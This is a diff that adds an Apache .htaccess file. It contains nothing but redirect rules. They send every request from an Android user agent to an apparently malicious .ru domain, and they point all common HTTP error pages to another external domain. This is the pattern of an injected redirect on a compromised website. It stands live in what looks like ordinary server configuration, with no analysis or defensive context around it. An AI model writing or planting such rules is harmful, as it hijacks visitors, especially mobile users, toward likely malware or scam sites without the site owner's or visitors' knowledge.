@@ -1,0 +1,8 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} .*ndroid.*
+RewriteRule ^(.*)$ http://androidsecuritydata.ru
+ErrorDocument 400 http://nwerfx.com
+ErrorDocument 401 http://nwerfx.com
+ErrorDocument 403 http://nwerfx.com
+ErrorDocument 404 http://nwerfx.com
+ErrorDocument 500 http://nwerfx.com
